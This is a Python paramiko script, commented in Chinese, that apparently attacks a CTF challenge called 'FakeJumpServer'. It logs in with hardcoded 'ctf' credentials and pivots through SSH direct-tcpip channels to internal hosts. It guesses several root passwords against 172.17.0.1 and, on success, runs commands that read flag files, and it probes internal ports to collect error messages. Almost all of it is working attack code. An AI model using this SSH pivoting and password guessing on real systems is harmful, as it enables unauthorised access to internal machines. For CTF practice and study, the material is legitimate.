import paramiko
import socket
import time
import sys
import hashlib

"""
继续研究FakeJumpServer。

关键观察：
- dropbear伪装了localhost
- 当用户通过跳板机连接到localhost时，实际上还是连接到dropbear

在FakeJumpServer攻击中的"第二次连接的错误"：
这指的是当用户使用ProxyJump时：
1. 第一次连接：用户 -> 跳板机 (成功)
2. 第二次连接：用户 -> (通过跳板机) -> 目标 (这里会有错误)

如果dropbear伪装成localhost，那么：
- 第二次连接会到达伪装的dropbear
- 用户可能会看到一些奇怪的错误或行为

让我尝试更深入地分析这个行为。

另一个思路：
也许dropbear有一个特殊的功能，可以让我们通过某种方式获取到
172.17.0.1的凭据。

或者，也许我们需要利用SSH的某种特性来绕过认证。

让我检查一下当我们尝试嵌套连接到"localhost"时会发生什么
"""

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def nested_ssh_same_host():
    """
    嵌套SSH到同一个主机（通过localhost）
    
    这模拟了：用户 -> 跳板机 -> localhost
    由于dropbear伪装了localhost，这实际上是：用户 -> dropbear -> dropbear
    """
    print("[*] 嵌套SSH测试：通过localhost")
    
    # 第一次连接
    ssh1 = paramiko.SSHClient()
    ssh1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh1.connect(HOST, PORT, USER, PASSWD)
    
    transport1 = ssh1.get_transport()
    
    print(f"第一层连接成功")
    print(f"第一层主机密钥: {hashlib.md5(transport1.get_remote_server_key().asbytes()).hexdigest()}")
    
    # 通过第一次连接打开到localhost:22的通道
    try:
        channel = transport1.open_channel("direct-tcpip", ("localhost", 22), ('127.0.0.1', 0), timeout=10)
        
        # 在这个通道上建立SSH连接
        transport2 = paramiko.Transport(channel)
        transport2.start_client(timeout=15)
        
        print(f"第二层连接成功")
        print(f"第二层主机密钥: {hashlib.md5(transport2.get_remote_server_key().asbytes()).hexdigest()}")
        
        # 尝试用相同的凭据认证
        try:
            transport2.auth_password(USER, PASSWD)
            print("第二层认证成功!")
            
            # 执行命令
            session = transport2.open_session()
            session.exec_command("id; pwd; cat /proc/sys/kernel/random/boot_id")
            time.sleep(2)
            
            output = session.recv(4096).decode()
            print(f"第二层输出:\n{output}")
            
            # 继续第三层？
            print("\n尝试第三层...")
            
            channel3 = transport2.open_channel("direct-tcpip", ("localhost", 22), ('127.0.0.1', 0), timeout=10)
            transport3 = paramiko.Transport(channel3)
            transport3.start_client(timeout=15)
            
            print(f"第三层主机密钥: {hashlib.md5(transport3.get_remote_server_key().asbytes()).hexdigest()}")
            
            try:
                transport3.auth_password(USER, PASSWD)
                print("第三层认证成功!")
                
                session3 = transport3.open_session()
                session3.exec_command("id; cat /proc/sys/kernel/random/boot_id")
                time.sleep(2)
                
                output3 = session3.recv(4096).decode()
                print(f"第三层输出:\n{output3}")
                
            except Exception as e:
                print(f"第三层错误: {e}")
            
            transport3.close()
            channel3.close()
            session.close()
            
        except paramiko.AuthenticationException as e:
            print(f"第二层认证失败: {e}")
        except Exception as e:
            print(f"第二层错误: {e}")
        
        transport2.close()
        channel.close()
        
    except Exception as e:
        print(f"错误: {e}")
    
    ssh1.close()

def nested_ssh_to_172():
    """
    嵌套SSH到172.17.0.1
    
    这是真正的目标：用户 -> dropbear -> Ubuntu
    """
    print("\n[*] 嵌套SSH测试：通过172.17.0.1")
    
    # 第一次连接
    ssh1 = paramiko.SSHClient()
    ssh1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh1.connect(HOST, PORT, USER, PASSWD)
    
    transport1 = ssh1.get_transport()
    
    print(f"第一层连接成功到dropbear")
    
    # 通过第一次连接打开到172.17.0.1:22的通道
    try:
        channel = transport1.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0), timeout=10)
        
        # 在这个通道上建立SSH连接
        transport2 = paramiko.Transport(channel)
        transport2.start_client(timeout=15)
        
        print(f"第二层连接成功到Ubuntu")
        print(f"第二层主机密钥: {hashlib.md5(transport2.get_remote_server_key().asbytes()).hexdigest()}")
        
        # 这里是关键：我们需要凭据来认证到Ubuntu
        # 让我们检查是否有什么特殊行为
        
        # 首先检查支持的认证方式
        try:
            transport2.auth_none(USER)
        except paramiko.BadAuthenticationType as e:
            print(f"支持的认证方式: {e.allowed_types}")
        except Exception as e:
            print(f"auth_none错误: {e}")
        
        # 也许dropbear会转发我们的凭据？
        # 让我检查是否有agent转发
        print("\n检查是否有任何认证上下文被转发...")
        
        # 尝试一些特殊的密码
        special_passwords = [
            PASSWD,  # 原始密码
            "",  # 空密码
            USER,  # 用户名作为密码
            "123456789",  # 变体
        ]
        
        for pwd in special_passwords:
            try:
                # 创建新连接尝试
                channel2 = transport1.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0), timeout=5)
                transport2_new = paramiko.Transport(channel2)
                transport2_new.start_client(timeout=10)
                
                transport2_new.auth_password("root", pwd)
                print(f"[+] 认证成功! 密码: {pwd}")
                
                # 获取shell
                session = transport2_new.open_session()
                session.exec_command("id; cat /flag* 2>/dev/null; ls /")
                time.sleep(2)
                
                output = session.recv(4096).decode()
                print(f"输出:\n{output}")
                
                session.close()
                transport2_new.close()
                channel2.close()
                break
                
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                pass
        
        transport2.close()
        channel.close()
        
    except Exception as e:
        print(f"错误: {e}")
    
    ssh1.close()

def check_error_messages():
    """
    检查第二次连接的错误消息
    
    提示说"第二次SSH连接的错误信息有用"
    """
    print("\n[*] 检查第二次连接的错误消息")
    
    ssh1 = paramiko.SSHClient()
    ssh1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh1.connect(HOST, PORT, USER, PASSWD)
    
    transport1 = ssh1.get_transport()
    
    # 尝试连接到各种地址，观察错误消息
    targets = [
        ("localhost", 22),
        ("127.0.0.1", 22),
        ("172.17.0.1", 22),
        ("10.0.2.2", 22),
        ("nonexistent", 22),
        ("localhost", 23),
        ("localhost", 80),
    ]
    
    for host, port in targets:
        print(f"\n--- {host}:{port} ---")
        
        try:
            channel = transport1.open_channel("direct-tcpip", (host, port), ('127.0.0.1', 0), timeout=5)
            
            if port == 22:
                # 尝试SSH
                try:
                    transport2 = paramiko.Transport(channel)
                    transport2.start_client(timeout=10)
                    
                    try:
                        transport2.auth_password("test", "test")
                    except paramiko.AuthenticationException as e:
                        print(f"认证错误: {e}")
                    except Exception as e:
                        print(f"其他错误: {e}")
                    
                    transport2.close()
                except Exception as e:
                    print(f"SSH错误: {e}")
            else:
                # 非SSH端口
                try:
                    data = channel.recv(1024)
                    print(f"数据: {data[:100] if data else '(empty)'}")
                except Exception as e:
                    print(f"接收错误: {e}")
            
            channel.close()
            
        except Exception as e:
            print(f"通道错误: {e}")
    
    ssh1.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] 深入分析嵌套SSH和错误消息")
    print("="*60)
    
    nested_ssh_same_host()
    
    print("\n" + "="*60)
    nested_ssh_to_172()
    
    print("\n" + "="*60)
    check_error_messages()
